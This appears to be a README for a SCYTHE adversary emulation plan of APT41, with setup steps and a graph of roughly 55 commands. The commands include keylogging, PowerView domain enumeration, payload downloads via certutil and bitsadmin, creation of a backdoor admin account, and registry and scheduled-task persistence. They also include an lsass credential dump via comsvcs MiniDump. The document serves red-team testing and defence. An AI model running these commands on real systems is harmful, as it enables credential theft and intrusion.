# APT41 Adversary Emulation Plan

This threat is explained further in SCYTHE's Threat Thursday blog: https://www.scythe.io/library/threatthursday-apt41

Based on the Adversary Emulation Plan published here: https://security-tzu.com/2020/09/23/emulation-plan-for-apt41/

To emulate:

1. Download and import the threat in JSON format to your SCYTHE instanc:https://github.com/scythe-io/community-threats/blob/master/APT41/APT41_scythe_threat.json
2. Download the Virtual File System (VFS) files under APT41/VFS: https://github.com/ElaineNeuk/community-threats/tree/master/APT41/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/APT41
4. Click "Create Campaign from Threat"
5. Name the Campaign
6. Parameters: Replace unicorn.scythedemo.com with your SCYTHE instance IP address or FQDN.
7. Restrict campaign to the device or domain where it will execute. This is to emulate APT41 use of Execution Gaurdrails: Environmental Keying (T1480.001)
8. Select the Communication module. Use DNS, HTTP, or HTTPS over default TCP port 53, 80 or 443 respectively - HTTP and HTTPS will be much quicker. However, APT41 uses DNS as well. We recommend using DNS as long-haul C2 only.
9. Start Campaign


 #Attack Graph
```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load keylogger </i> <br>"]
Step2["<b> module: keylogger </b> <br><h4> parameters: </h4> <i> --start </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1056'>att&ck-technique:T1056</a><br>
"]
Step3["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br><a href='https://attack.mitre.org/techniques/T1071.001'>att&ck-technique:T1071.001</a><br>
"]
Step4["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load upsh </i> <br><a href='https://attack.mitre.org/techniques/T1059.001'>att&ck-technique:T1059.001</a><br>
"]
Step5["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load downloader </i> <br><a href='https://attack.mitre.org/techniques/T1105'>att&ck-technique:T1105</a><br>
"]
Step6["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c mkdir %USERPROFILE%\Desktop\APT41 </i> <br><a href='https://attack.mitre.org/techniques/T1059.003'>att&ck-technique:T1059.003</a><br>
"]
Step7[""]
Step8["<b> module: run </b> <br><h4> parameters: </h4> <i> whoami </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step9["<b> module: run </b> <br><h4> parameters: </h4> <i> ipconfig /all </i> <br><a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step10["<b> module: run </b> <br><h4> parameters: </h4> <i> netstat -ant </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1049'>att&ck-technique:T1049</a><br>
"]
Step11["<b> module: run </b> <br><h4> parameters: </h4> <i> netstat -r </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1049'>att&ck-technique:T1049</a><br>
"]
Step12["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/APT41/PowerView.ps1 --dest %USERPROFILE%\Desktop\APT41\PowerView.ps1 </i> <br><a href='https://attack.mitre.org/techniques/T1105'>att&ck-technique:T1105</a><br>
"]
Step13["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe -exec bypass -Command &{Import-Module %USERPROFILE%\Desktop\APT41\PowerView.ps1;Get-NetRDPSession} </i> <br><a href='https://attack.mitre.org/techniques/T1049'>att&ck-technique:T1049</a><br>
"]
Step14["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c net share </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1135'>att&ck-technique:T1135</a><br>
"]
Step15["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe -exec bypass -Command &{Import-Module %USERPROFILE%\Desktop\APT41\PowerView.ps1;Get-NetShare} </i> <br><a href='https://attack.mitre.org/techniques/T1049'>att&ck-technique:T1049</a><br>
"]
Step16["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe -exec bypass -Command &{Import-Module %USERPROFILE%\Desktop\APT41\PowerView.ps1;Get-Forest} </i> <br><a href='https://attack.mitre.org/techniques/T1046'>att&ck-technique:T1046</a><br>
"]
Step17["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe -exec bypass -Command &{Import-Module %USERPROFILE%\Desktop\APT41\PowerView.ps1;Get-ForestDomain} </i> <br><a href='https://attack.mitre.org/techniques/T1046'>att&ck-technique:T1046</a><br>
"]
Step18["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe -exec bypass -Command &{Import-Module %USERPROFILE%\Desktop\APT41\PowerView.ps1;Get-Domain} </i> <br><a href='https://attack.mitre.org/techniques/T1046'>att&ck-technique:T1046</a><br>
"]
Step19["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe -exec bypass -Command &{Import-Module %USERPROFILE%\Desktop\APT41\PowerView.ps1;Get-DomainTrust} </i> <br><a href='https://attack.mitre.org/techniques/T1046'>att&ck-technique:T1046</a><br>
"]
Step20["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe -exec bypass -Command &{Import-Module %USERPROFILE%\Desktop\APT41\PowerView.ps1;Get-DomainTrustMapping} </i> <br><a href='https://attack.mitre.org/techniques/T1046'>att&ck-technique:T1046</a><br>
"]
Step21["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c nltest /domain_trusts > %USERPROFILE%\Desktop\APT41\ad_trustdmp.txt </i> <br><a href='https://attack.mitre.org/techniques/T1482'>att&ck-technique:T1482</a><br>
"]
Step22["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c type %USERPROFILE%\Desktop\APT41\ad_trustdmp.txt </i> <br><a href='https://attack.mitre.org/techniques/T1482'>att&ck-technique:T1482</a><br>
"]
Step23["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c net group Domain Admins /do </i> <br><a href='https://attack.mitre.org/techniques/T1069.002'>att&ck-technique:T1069.002</a><br>
"]
Step24[""]
Step25["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell -exec bypass -nop -enc dwBoAG8AYQBtAGkA </i> <br><a href='https://attack.mitre.org/techniques/T1059.001'>att&ck-technique:T1059.001</a><br>
"]
Step26["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/APT41/WmiExec.ps1 --dest %USERPROFILE%\Desktop\APT41\WmiExec.ps1 </i> <br><a href='https://attack.mitre.org/techniques/T1105'>att&ck-technique:T1105</a><br>
"]
Step27["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c wmic useraccount get /ALL /format:csv </i> <br><a href='https://attack.mitre.org/tactics/TA0002'>att&ck-tactic:TA0002</a><br>
<a href='https://attack.mitre.org/techniques/T1047'>att&ck-technique:T1047</a><br>
"]
Step28[""]
Step29["<b> module: run </b> <br><h4> parameters: </h4> <i> bitsadmin /transfer bbbb https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1 %USERPROFILE%\Desktop\APT41\ASREPRoast.ps1 </i> <br><a href='https://attack.mitre.org/techniques/T1197'>att&ck-technique:T1197</a><br>
"]
Step30["<b> module: run </b> <br><h4> parameters: </h4> <i> certutil -urlcache -split -f https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 %USERPROFILE%\Desktop\APT41\SharpHound.ps1 </i> <br><a href='https://attack.mitre.org/techniques/T1202'>att&ck-technique:T1202</a><br>
"]
Step31[""]
Step32["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG ADD HKEY_CURRENT_USER\Software\ExampleRegKey /v Example /d Example Data /f </i> <br><a href='https://attack.mitre.org/techniques/T1547.001'>att&ck-technique:T1547.001</a><br>
"]
Step33["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG QUERY HKEY_CURRENT_USER\Software\ExampleRegKey </i> <br><a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step34["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /CREATE /SC DAILY /TN MyTasks\Example Task /TR C:\example_service.exe /ST 11:00 /F </i> <br><a href='https://attack.mitre.org/techniques/T1053'>att&ck-technique:T1053</a><br>
"]
Step35["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /QUERY /TN MyTasks\Example Task </i> <br><a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step36["<b> module: controller </b> <br><h4> parameters: </h4> <i> --integrity </i> <br><a href='https://attack.mitre.org/techniques/T1069'>att&ck-technique:T1069</a><br>
"]
Step37[""]
Step38["<b> module: run </b> <br><h4> parameters: </h4> <i> net user APT41 Passw0rd! /add </i> <br><a href='https://attack.mitre.org/techniques/T1136'>att&ck-technique:T1136</a><br>
"]
Step39["<b> module: run </b> <br><h4> parameters: </h4> <i> net localgroup Administrators APT41 /add </i> <br><a href='https://attack.mitre.org/techniques/T1136.001'>att&ck-technique:T1136.001</a><br>
"]
Step40["<b> module: run </b> <br><h4> parameters: </h4> <i> net user </i> <br><a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step41["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c sc create StorSyncSvc binPath= %SystemRoot%\system32\svchost.exe -k StorSyncSvc type= share start= auto error= ignore DisplayName= StorSyncSvc </i> <br><a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step42["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c sc query StorSyncSvc </i> <br><a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step43[""]
Step44["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Invoke-Command -ScriptBlock {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full} </i> <br><a href='https://attack.mitre.org/tactics/TA0006'>att&ck-tactic:TA0006</a><br>
<a href='https://attack.mitre.org/techniques/T1003.001'>att&ck-technique:T1003.001</a><br>
"]
Step45["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Invoke-Command -ScriptBlock {Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
} </i> <br><a href='https://attack.mitre.org/tactics/TA0006'>att&ck-tactic:TA0006</a><br>
<a href='https://attack.mitre.org/techniques/T1003.001'>att&ck-technique:T1003.001</a><br>
"]
Step46[""]
Step47["<b> module: run </b> <br><h4> parameters: </h4> <i> net localgroup Administrators APT41 /del </i> <br>"]
Step48["<b> module: run </b> <br><h4> parameters: </h4> <i> net user APT41 /del </i> <br><a href='https://attack.mitre.org/techniques/T1136'>att&ck-technique:T1136</a><br>
"]
Step49["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c sc delete StorSyncSvc </i> <br><a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step50["<b> module: keylogger </b> <br><h4> parameters: </h4> <i> --current </i> <br><a href='https://attack.mitre.org/techniques/T1056.001'>att&ck-technique:T1056.001</a><br>
"]
Step51["<b> module: keylogger </b> <br><h4> parameters: </h4> <i> --stop </i> <br><a href='https://attack.mitre.org/techniques/T1056.001'>att&ck-technique:T1056.001</a><br>
"]
Step52["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c REG DELETE HKEY_CURRENT_USER\Software\ExampleRegKey /f </i> <br><a href='https://attack.mitre.org/techniques/T1112'>att&ck-technique:T1112</a><br>
<a href='https://attack.mitre.org/techniques/T1547.001'>att&ck-technique:T1547.001</a><br>
"]
Step53["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /DELETE /TN MyTasks\Example Task /F </i> <br><a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step54["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c rmdir /Q /S %USERPROFILE%\Desktop\APT41 </i> <br><a href='https://attack.mitre.org/techniques/T1485'>att&ck-technique:T1485</a><br>
"]
Step55["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
Step22 --> Step23
Step23 --> Step24
Step24 --> Step25
Step25 --> Step26
Step26 --> Step27
Step27 --> Step28
Step28 --> Step29
Step29 --> Step30
Step30 --> Step31
Step31 --> Step32
Step32 --> Step33
Step33 --> Step34
Step34 --> Step35
Step35 --> Step36
Step36 --> Step37
Step37 --> Step38
Step38 --> Step39
Step39 --> Step40
Step40 --> Step41
Step41 --> Step42
Step42 --> Step43
Step43 --> Step44
Step44 --> Step45
Step45 --> Step46
Step46 --> Step47
Step47 --> Step48
Step48 --> Step49
Step49 --> Step50
Step50 --> Step51
Step51 --> Step52
Step52 --> Step53
Step53 --> Step54
Step54 --> Step55
Step55 --> Step56
```
